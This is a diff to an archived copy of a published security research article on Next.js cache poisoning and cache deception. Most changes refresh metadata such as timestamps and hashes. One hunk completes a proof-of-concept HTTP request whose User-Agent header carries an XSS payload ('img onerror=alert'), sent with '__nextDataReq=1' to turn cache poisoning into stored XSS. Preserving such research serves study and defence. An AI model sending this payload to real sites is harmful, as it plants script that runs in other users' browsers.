@@ -6,9 +6,9 @@ resource: "https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-
 tags: [article, webseclist-reference, en-US, zhero-web-security, cache-poisoning, xss, cache-deception, nextjs, dos, cve, nodejs, bug-bounty, owasp-a03-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-09T01:51:28+00:00"
+  at: "2026-08-16T00:01:21+00:00"
 status: stable
-stale_after: 2027-08-09
+stale_after: 2027-08-16
 sources:
   - id: original
     resource: "https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir"
@@ -22,7 +22,7 @@ canonical_url: ""
 cited_by:
   - "2025.md:11"
 commit: ""
-content_sha256: 1a3d22c4ac866db5d812f8f45e2d0c5b51a5661a3b488ca7daccae603b1889e7
+content_sha256: 5ad8111c19b2b3956b419551c0713b9505a419670294d5b79f7f0b37f7a4cff5
 depth: full
 depth_reason: default
 kind: article
@@ -34,8 +34,8 @@ publisher: zhero_web_security
 publisher_english: ""
 raw_sha256: d157a1b016b19befea228726ee6e6139739f4855ab14731714dac96587300c39
 retrieved_from: "https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir"
-retrieved_kind: live
-retrieved_utc: "2026-08-09T01:51:28+00:00"
+retrieved_kind: stored
+retrieved_utc: "2026-08-16T00:01:21+00:00"
 slug: 2025-zhero-web-security-next-js-cache-chains-stale-elixir
 snapshot: ""
 title_english: ""
@@ -49,7 +49,7 @@ translation_of: ""
 
 - Published: 2025-01-21
 - Original: <https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir>
-- Preserved from: https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir (live) on 2026-08-09
+- Preserved from: https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir (stored) on 2026-08-16
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -278,7 +278,7 @@ So for an SXSS to be possible, **it only takes one element to be reflected**. A 
 ```
 GET /poc?__nextDataReq=1 HTTP/1.1
 Host: localhost:3000
-User-Agent: CP TO SXSS ON NEXT.JS : <img src=x
+User-Agent: CP TO SXSS ON NEXT.JS : <img src=x onerror=alert('Palestine')>
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
